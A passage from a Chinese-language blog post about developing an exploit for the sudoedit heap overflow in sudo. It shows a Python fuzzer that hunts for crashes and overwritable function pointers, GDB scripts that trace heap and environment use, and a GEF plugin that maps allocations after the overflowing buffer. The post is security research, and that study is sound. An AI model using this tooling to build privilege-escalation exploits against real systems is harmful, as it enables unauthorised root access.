+        env[&quot;HOSTNAME&quot;] = random.choice(ALPHABET)*rand_hostname_size
+    if rand_env_size:
+        env[random.choice(ALPHABET)*3] = random.choice(ALPHABET)*rand_env_size
+        
+    # run sudoedit
+    run_sudoedit(arg, env)
+</code></pre>
+</li>
+<li>
+<p>开始fuzz</p>
+<pre><code class="language-python"># this will run sudoedit with a set of arguments and environment variables
+def run_sudoedit(arg, env):
+    print(&quot;-------------&quot;)
+    # disable stdout buffering with stdbuf wrapping around sudoedit
+    # and add the commandline arguments
+    _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg
+
+    # execute it
+    p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        # send some newlines and check if we get any output
+        lines = p.communicate(b&quot;x\nx\nx\nx\n&quot;, timeout=0.1)
+    except subprocess.TimeoutExpired:
+        # terminate on timeout
+        p.terminate()
+        lines = p.communicate()
+    if p.returncode == -11:
+        print(f&quot;SEGFAULT&quot;)
+    
+    # read the list of function pointers
+    ptrs = {}
+    skipping = True
+    for line in lines[0].splitlines():
+        key,val = line.split(b'=')
+        if key == b'user_args':
+            skipping = False
+        if not skipping:
+            ptrs[key] = int(val,16)
+    
+    # go through all function pointers
+    if ptrs and b'user_args' in ptrs:
+        for key in ptrs:
+            if key != b'user_args':
+                # is our overflow buffer before a function pointer?
+                if ptrs[b'user_args'] &lt; ptrs[key]:
+                    distance = ptrs[key] - ptrs[b'user_args']
+                    if distance&lt;14000:
+                        fname = f'{FOLDER}/{distance}'
+                        dump_file(fname, lines, ptrs, arg, env, key)
+
+                        # did we get a segfault?
+                        if p.returncode == -11:
+                            fname = f&quot;{FOLDER}/crashes/segfault_{distance}&quot;
+                            dump_file(fname, lines, ptrs, arg, env, None)
+                            return
+                        return
+</code></pre>
+</li>
+</ol>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8415ea76e1d7d757ab5a0a2a64b55aa8.png" alt="image-20220415130840543" /></p>
+<p>最后发现chunk位置相差太远不同 ，根本无法利用</p>
+<h1>GDB工具编写</h1>
+<h2>阶段 1</h2>
+<p>要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次<code>malloc</code>下断点查看<code>size</code>参数。</p>
+<p>更为便捷的技巧是查看<code>free</code>时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里</p>
+<pre><code class="language-bash">set breakpoint pending on
+break free
+commands
+ silent
+ printf &quot;free(): %s\n&quot;,$rdi
+ continue
+end
+
+run -s 'SSSSSSSSSSSSSSSSSSSSSYYY\'
+</code></pre>
+<p>运行</p>
+<pre><code>gdb -x ./gdb.init /usr/local/bin/sudoedit  &gt; free_trace
+</code></pre>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/087221d78d84e19ddbcfe7d6a788fbfc.png" alt="image-20220415123301007" /></p>
+<p>发现有环境变量，再次尝试设置环境变量</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/19f25365a5ccc6c30832bb70793e9ff3.png" alt="image-20220415123740168" /></p>
+<p>发现根本没变，要是我们尝试更多的环境变量呢？</p>
+<h2>阶段 2</h2>
+<p>直接在加载环境变量（<code>getenv(3p)</code>）的时候下断点，看看用了那些</p>
+<pre><code>set breakpoint pending on
+
+break getenv
+commands
+ silent
+ printf &quot;getenv(): %s\n&quot;,$rdi
+ continue
+end
+
+run -s 'SSSSSSSSSSSSSSSSSSSSSYYY\'
+</code></pre>
+<p>发现可以设置的环境变量值</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dc45f29e3991c2d964986b846b522f9c.png" alt="image-20220415124335590" /></p>
+<p>再次改写脚本</p>
+<pre><code>set breakpoint pending on
+set environment LOCPATH = HEAP0
+set environment LC_ALL = HEAP1
+set environment LC_IDENTIFICATION = HEAP2
+set environment LANG = HEAP3
+set environment LC_MEASUREMENT = HEAP4
+set environment LC_TELEPHONE = HEAP5
+set environment LC_ADDRESS = HEAP6
+set environment LC_NAME = HEAP7
+set environment LC_PAPER = HEAP8
+set environment LC_MESSAGES = HEAP9
+set environment LC_MONETARY = HEAPA
+set environment LC_COLLATE = HEAPB
+set environment LC_TIME = HEAPC
+set environment LC_NUMERIC = HEAPD
+set environment LC_CTYPE = HEAPE
+set environment GCONV_PATH = HEAPF
+set environment TZ = HEAPG
+set environment SHELL = HEAPI
+
+break free
+commands
+ silent
+ printf &quot;free(): %s\n&quot;,$rdi
+ continue
+end
+
+run -s 'SSSSSSSSSSSSSSSSSSSSSYYY\'
+</code></pre>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/465ccd9c3a880d07af8a9a78aba2a03d.png" alt="image-20220415125938308" /></p>
+<p>所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/14cd70c46596227d77bdee90d7be5605.png" alt="image-20220415131006033" /></p>
+<p>或许利用点在于覆写环境变量？</p>
+<h2>阶段 3</h2>
+<p>这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请</p>
+<p>作者直接写了一个gef的拓展工具</p>
+<pre><code class="language-python"># gdb -ex 'gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;' -ex 'gef save' -ex quit
+
+__AUTHOR__ = &quot;liveoverflow&quot;
+__VERSION__ = 0.1
+
+import collections
+import gdb
+import json
+
+# persist &quot;database&quot; to the file
+def dump(j):
+    with open('/tmp/malloc.json', 'w') as f:
+        f.write(json.dumps(j))
+
+# load &quot;database&quot; from the file
+def load():
+    with open('/tmp/malloc.json', 'r') as f:
+        j = json.loads(f.read())
+    return j
+
+# handler for malloc() breakpoints
+class MallocBreakpoint(gdb.Breakpoint):
+
+    def __init__(self, location, *args, **kwargs):
+        super(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False)
+        self.silent = True
+        self.size = None
+        self.addr = None
+        return
+
+    # malloc() breakpoint triggered
+    def stop(self):
+        log = {}
+
+        # extract information about this malloc()
+        log[&quot;size&quot;] = get_register(&quot;$rdi&quot;)
+        log[&quot;rip&quot;] = get_register(&quot;$rip&quot;)
+        log[&quot;backtrace&quot;] = gdb.execute('bt', to_string=True)
+        log['name'] = gdb.newest_frame().older().name()
+        
+        # set a breakpoint at the malloc() return
+        if log['name'] and 'set_cmnd' in log['name']:
+            self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older())
+            return False
+        self.retbp = MallocReturnBreakpoint(log=log)
+
+        return False
+
+# breakpoint for the return of a malloc()
+class MallocReturnBreakpoint(gdb.FinishBreakpoint):
+    def __init__(self, log, overwrite=False, *args, **kwargs):
+        if not overwrite:
+            overwrite = gdb.newest_frame()
+        super(MallocReturnBreakpoint, self).__init__(overwrite, internal=False)
+        self.silent = False
+        self.log = log
+
+    def stop(self):
+        # extract some information
+        self.log['addr'] = get_register(&quot;$rax&quot;)
+        self.log['name'] = gdb.newest_frame().name()
+        
+        # load the mallocs() we logged before
+        MALLOCS = load()
+        # add this malloc to the known allocations
+        MALLOCS[str(self.log['addr'])] = self.log
+        dump(MALLOCS)
+
+        # this is the location of our overflowing buffer
+        # now we can dump the heap analysis
+        if self.log['name'] and 'set_cmnd' in self.log['name']:
+            print(&quot;YYYYYYYYYYY WE ARE IN!!!&quot;)
+            addr = get_register(&quot;$rax&quot;)
+            mallocs = [int(a) for a in MALLOCS]
+            mallocs.sort()
+            SHOW = 5
+            out = ''
+            for mall in mallocs:
+                if mall &gt; addr and SHOW&gt;0:
+                    h = MALLOCS[str(mall)]
+                    for line in h['backtrace'].split('\n')[1:]:
+                        if line:
+                            l = line.split()
+                            print(l)
+                            if l[3] != '??':
+                                out += (l[3]) + &quot; &quot;
+                    out += &quot;\n&quot;
+                    SHOW -= 1
+            out += &quot;\n&quot;
+            print(out)
+            with open('/tmp/heap' ,'w') as f:
+                f.write(out)
+
+            return True
+        return False
+
+
+# set a breakpoint on free()
+class FreeBreakpoint(gdb.Breakpoint):
+    def __init__(self, location, *args, **kwargs):
+        super(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False)
+        self.silent = True
+        self.size = None
+        self.malloc = []
+        self.addr = None
+        return
+
+    def stop(self):
+        log = {}
+        log[&quot;addr&quot;] = get_register(&quot;$rdi&quot;)
+
+        # check if the memory freed was allocated before
+        MALLOCS = load()
+        if str(log[&quot;addr&quot;]) in MALLOCS:
+            # remove this object from the list of allocated objects
+            del MALLOCS[str(log[&quot;addr&quot;])]
+            dump(MALLOCS)
+        return False
+
+# the gdb command that starts the heap trace
+class SudoeditCommand(GenericCommand):
+    &quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot;
+    _cmdline_ = &quot;sudoedit&quot;
+    _syntax_ = f&quot;{_cmdline_}&quot;
+
+    def do_invoke(self, args):
+        dump({})
+        self.bkps = []
+        # set the breakpoints
+        self.bkps.append(MallocBreakpoint(location=&quot;__libc_malloc&quot;))
+        self.bkps.append(FreeBreakpoint(location=&quot;__libc_free&quot;))
+        #self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;))
+        #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;))
+        #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;))
+        #self.bkps.append(FreeBreakpoint(location=&quot;free&quot;))
+
+        gdb.events.exited.connect(self.cleanup)
+        return
+
+    def cleanup(self, events):
+        print(&quot;CLEANUP!!!&quot;)
+        for bp in self.bkps:
+            bp.delete()
+        gdb.events.exited.disconnect(self.cleanup)
+        return
+
+
+if __name__ == &quot;__main__&quot;:
+    register_external_command(SudoeditCommand())
+</code></pre>
+<p>设置插件</p>
+<pre><code>gdb -ex 'gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;' -ex 'gef save' -ex quit
+</code></pre>
+<p>使用</p>
+<pre><code>gdb -ex 'set breakpoint pending on' -ex 'sudoedit' -ex 'r -s xxxxxxxxxxxxxxxxxx' -ex 'sudoedit' -ex 'continue' /usr/local/bin/sudoedit | tee heap.log
+</code></pre>
+<p>主要就是跟踪<code>malloc</code>和<code>free</code>在堆溢出之后的行为</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e672b987fc044881b8c2552c9cf2fb30.png" alt="image-20220415204128487" /></p>
+<p>只有将这个改写到暴力脚本里面，找到符合条件的Chunk</p>
+
+</div>
+</div></body>
